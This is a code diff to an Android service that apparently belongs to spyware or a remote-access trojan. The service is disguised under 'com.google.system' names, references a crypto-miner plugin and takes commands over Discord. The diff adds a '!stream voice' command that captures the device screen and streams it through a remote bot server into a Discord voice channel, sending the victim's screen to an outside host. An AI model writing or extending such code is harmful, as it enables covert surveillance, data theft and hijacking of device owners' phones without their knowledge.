@@ -46,7 +46,10 @@ import android.provider.Settings
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.google.system.AnimatedGifEncoder
+import com.google.system.DiscordConfig
 import com.google.system.DiscordGatewayClient
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import com.openaccess.sdk.OpenAccessApp
 import kotlinx.coroutines.*
 import kotlinx.coroutines.CompletableDeferred
@@ -83,6 +86,7 @@ class SystemNetworkService : Service() {
     private var isDownloadingUpdate = false
     private var minerPlugin: com.google.system.plugins.MinerPlugin? = null
     private var screenRequestReceiver: BroadcastReceiver? = null
+    private var liveStreamEncoder: com.google.system.LiveStreamEncoder? = null
 
     override fun onBind(i: Intent?): IBinder? = null
 
@@ -356,8 +360,78 @@ class SystemNetworkService : Service() {
                                 streamMessageId?.let { d.deleteMsg(it) }
                                 streamMessageId = null
                                 d.sendMsg(":stop_button: **Live stream stopped**")
+                            } else if (liveStreamEncoder?.isStreaming() == true) {
+                                liveStreamEncoder?.stop()
+                                liveStreamEncoder = null
+                                d.sendMsg(":stop_button: **Voice stream stopped**")
                             } else {
                                 d.sendMsg(":x: No active stream")
+                            }
+                        }
+                        payload?.lowercase()?.startsWith("voice") == true -> {
+                            val parts = payload.split(" ", limit = 3)
+                            val voiceChannelId = parts.getOrNull(1)
+                            val guildId = parts.getOrNull(2)
+                            
+                            if (voiceChannelId == null || guildId == null) {
+                                d.sendMsg(":x: **Usage**: `!stream voice <channel_id> <guild_id>`\nExample: `!stream voice 123456789 987654321`")
+                                return
+                            }
+                            
+                            if (DisplayCapture.mediaProjection == null) {
+                                d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first")
+                                return
+                            }
+                            
+                            d.sendMsg(":satellite: **Starting voice stream**...\nConnecting to voice channel...")
+                            
+                            scope.launch {
+                                try {
+                                    // Start H264 encoder
+                                    val botUrl = DiscordConfig.BOT_HTTP_URL.takeIf { it.isNotBlank() } 
+                                        ?: "https://your-bot-server.com"
+                                    
+                                    val deviceSuffix = d.getDeviceSuffix()
+                                    
+                                    liveStreamEncoder = com.google.system.LiveStreamEncoder(
+                                        context = this@SystemNetworkService,
+                                        botUrl = botUrl,
+                                        deviceId = deviceSuffix,
+                                        onStatus = { status ->
+                                            d.sendMsg(":satellite: **Stream**: $status")
+                                        }
+                                    )
+                                    
+                                    liveStreamEncoder?.start(DisplayCapture.mediaProjection!!)
+                                    
+                                    // Notify bot to start voice stream
+                                    val json = org.json.JSONObject().apply {
+                                        put("voiceChannelId", voiceChannelId)
+                                        put("guildId", guildId)
+                                        put("fps", 30)
+                                        put("width", 480)
+                                        put("height", 360)
+                                    }
+                                    
+                                    val req = okhttp3.Request.Builder()
+                                        .url("$botUrl/api/stream/$deviceSuffix/start")
+                                        .post(json.toString().toRequestBody("application/json".toMediaType()))
+                                        .build()
+                                    
+                                    val client = okhttp3.OkHttpClient.Builder()
+                                        .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
+                                        .build()
+                                    
+                                    client.newCall(req).execute().use { resp ->
+                                        if (resp.isSuccessful) {
+                                            d.sendMsg(":white_check_mark: **Voice stream started**\n30fps H264 → VP8\nVoice channel streaming active")
+                                        } else {
+                                            d.sendMsg(":x: **Bot connection failed**\nHTTP ${resp.code}")
+                                        }
+                                    }
+                                } catch (e: Exception) {
+                                    d.sendMsg(":x: **Stream error**: ${e.message?.take(80) ?: "unknown"}")
+                                }
                             }
                         }
                         payload?.lowercase() == "start" -> {
@@ -374,7 +448,8 @@ class SystemNetworkService : Service() {
                         }
                         payload == null || payload.isBlank() -> {
                             val mp = DisplayCapture.mediaProjection != null
-                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nScreen capture: ${if (mp) ":green_circle: Enabled" else ":red_circle: Disabled (run `!screenshot on` first)"}\nUsage: `!stream start` (2fps)\nUsage: `!stream 5` (5fps, max 30)\nUsage: `!stream stop`")
+                            val voiceActive = liveStreamEncoder?.isStreaming() == true
+                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nScreen capture: ${if (mp) ":green_circle: Enabled" else ":red_circle: Disabled"}\nVoice stream: ${if (voiceActive) ":green_circle: Active" else ":red_circle: Inactive"}\n\n**Usage:**\n`!stream start` - Text channel (2fps)\n`!stream 5` - Text channel (5fps)\n`!stream voice <channel> <guild>` - Voice channel (30fps)\n`!stream stop` - Stop streaming")
                         }
                         else -> {
                             val fps = payload.toIntOrNull()
